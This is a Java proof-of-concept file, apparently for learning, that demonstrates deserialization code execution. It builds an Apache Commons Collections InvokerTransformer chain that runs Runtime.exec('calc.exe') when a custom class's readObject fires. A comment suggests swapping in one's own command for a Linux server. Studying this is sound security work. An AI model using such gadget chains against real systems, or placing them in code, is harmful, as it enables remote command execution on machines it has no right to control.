package com.geektcp.alpha.util.serialize;


import java.io.*;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

/**
 * @author tanghaiyang on 2020/5/13 8:12.
 */

public class DeSerPoc {
    public static void main(String args[]) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),

                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                // 执行calc.exe，把这里改成自己要执行的命令即可；服务器是linux就以成linux命令
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        Transformer transformedChain = new ChainedTransformer(transformers);
        Map<String, String> beforeTransformerMap = new HashMap<>();
        beforeTransformerMap.put("value", "value");
        Map afterTransformerMap = TransformedMap.decorate(beforeTransformerMap, null, transformedChain);
        // SerObjRewrite中的setValue能触发afterTransformerMap中的代码的执行
        SerObjRewrite serObj = new SerObjRewrite();
        serObj.map = afterTransformerMap;
        // 将对象写入到object.ser
        FileOutputStream fos = new FileOutputStream("object.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(serObj);
        oos.close();

        deSerializeObj();
    }


    public static void serializeObj() throws Exception {
        // 实例化对象
        SerObj serObj = new SerObj();
        serObj.name = "serobj";

        // 以下就是序列化操作
        // 打开object.ser文件
        FileOutputStream fos = new FileOutputStream("object.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        // 使用writeObject()方法将serObj对象写到object.ser文件
        oos.writeObject(serObj);
        oos.close();
        fos.close();
    }

    public static void deSerializeObj() throws Exception {
        // 以下就是反序列化操作
        // 打开object.ser文件
        FileInputStream fis = new FileInputStream("object.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        // 使用从object.ser文件中读取对象
        SerObj deSerObj = (SerObj) ois.readObject();
        System.out.println(deSerObj.name);
        ois.close();
        fis.close();
    }
}

// 重写SerObj类，其实也不叫重写就随便新实现一个序例化类，重写序列化类的readObject方法，该方法在反序列化时会被自动调用
// 在readObject中调用setValue，setValue能触发注入代码的调用，这正是代码注入的关键
class SerObjRewrite implements Serializable {
    // name可有可无，又不是真重写
    public String name;
    public Map map;

    private void readObject(java.io.ObjectInputStream in) throws ClassNotFoundException, IOException {
        in.defaultReadObject();
        if (map != null) {
            Map.Entry e = (Map.Entry) map.entrySet().iterator().next();
            e.setValue("400m");
        }
    }
}

class SerObj implements Serializable {
    public String name;
}

class SerThyObj implements Serializable {
    public String name;
    private void readObject(java.io.ObjectInputStream in) throws ClassNotFoundException, IOException {
        System.out.println("1111111111111111");
    }
}